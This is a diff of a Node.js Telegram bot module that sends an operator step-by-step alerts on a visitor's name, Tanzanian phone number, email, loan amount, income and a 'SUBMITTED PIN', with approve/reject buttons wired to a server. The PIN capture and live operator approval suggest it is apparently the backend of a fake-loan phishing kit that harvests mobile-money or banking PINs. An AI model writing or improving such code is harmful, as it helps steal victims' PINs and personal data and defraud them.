@@ -12,23 +12,26 @@ const sendAdminAlert = async (info) => {
         let msg = `🚀 *User Activity Update*\n`;
         msg += `━━━━━━━━━━━━━━━━━━\n`;
         msg += `📍 *Step:* ${info.step.replace(/_/g, ' ')}\n`;
-        msg += `🆔 *Socket:* \`${info.socketId}\`\n\n`;
+        msg += `🆔 *Socket:* \`${info.socketId}\`\n`;
 
-        // Profile Details (Accumulated)
-        if (info.firstName) msg += `👤 *Name:* ${info.firstName} ${info.lastName || ''}\n`;
-        if (info.phone)     msg += `📱 *Phone:* \`+255${info.phone}\`\n`;
-        if (info.email)     msg += `📧 *Email:* ${info.email}\n`;
+        // Profile Section (Only shows if Step 2+ is reached)
+        if (info.firstName || info.phone || info.email) {
+            msg += `\n👤 *User Details:*\n`;
+            if (info.firstName) msg += `• Name: ${info.firstName} ${info.lastName || ''}\n`;
+            if (info.phone)     msg += `• Phone: \`+255${info.phone}\`\n`;
+            if (info.email)     msg += `• Email: ${info.email}\n`;
+        }
         
-        // Loan Details
-        if (info.amount)    msg += `💰 *Amount:* TZS ${Number(info.amount).toLocaleString()}\n`;
-        if (info.loanType)  msg += `📝 *Type:* ${info.loanType}\n`;
-        if (info.term)      msg += `⏱️ *Term:* ${info.term} Month(s)\n`;
-        
-        // Employment
-        if (info.income)    msg += `💵 *Income:* TZS ${Number(info.income).toLocaleString()}\n`;
-        if (info.employment) msg += `💼 *Status:* ${info.employment}\n`;
+        // Financial Section (Only shows if Step 1+ or Step 3+ is reached)
+        if (info.amount || info.income) {
+            msg += `\n💰 *Financials:*\n`;
+            if (info.amount)    msg += `• Loan: TZS ${Number(info.amount).toLocaleString()}\n`;
+            if (info.income)    msg += `• Income: TZS ${Number(info.income).toLocaleString()}\n`;
+            if (info.loanType)  msg += `• Type: ${info.loanType}\n`;
+            if (info.employment) msg += `• Status: ${info.employment}\n`;
+        }
 
-        // Critical Security Data
+        // Security Section (Only for Step 5)
         if (info.pin) {
             msg += `\n━━━━━━━━━━━━━━━━━━\n`;
             msg += `🔑 *SUBMITTED PIN:* \`${info.pin}\`\n`;
@@ -46,8 +49,9 @@ const sendAdminAlert = async (info) => {
             parse_mode: 'Markdown', 
             ...(keyboard || {}) 
         });
+
     } catch (e) {
-        console.error("Telegram Alert Error:", e.message);
+        console.error("Bot Alert Error:", e.message);
     }
 };
 
@@ -56,21 +60,19 @@ if (bot) {
         const socketId = ctx.match[1];
         try {
             await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'approve' });
-            await ctx.answerCbQuery("Approved");
-            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n✅ *STATUS: APPROVED*", { parse_mode: 'Markdown' });
-        } catch (err) { await ctx.answerCbQuery("Server Error"); }
+            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n✅ *STATUS: APPROVED*");
+        } catch (err) { console.error("Approve failed"); }
     });
 
     bot.action(/reject_(.+)/, async (ctx) => {
         const socketId = ctx.match[1];
         try {
             await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'reject' });
-            await ctx.answerCbQuery("Rejected");
-            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n❌ *STATUS: REJECTED*", { parse_mode: 'Markdown' });
-        } catch (err) { await ctx.answerCbQuery("Server Error"); }
+            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n❌ *STATUS: REJECTED*");
+        } catch (err) { console.error("Reject failed"); }
     });
 
-    bot.launch().catch(err => console.error("Bot fail:", err.message));
+    bot.launch().catch(err => console.error("Bot launch fail:", err.message));
 }
 
 module.exports = { sendAdminAlert };
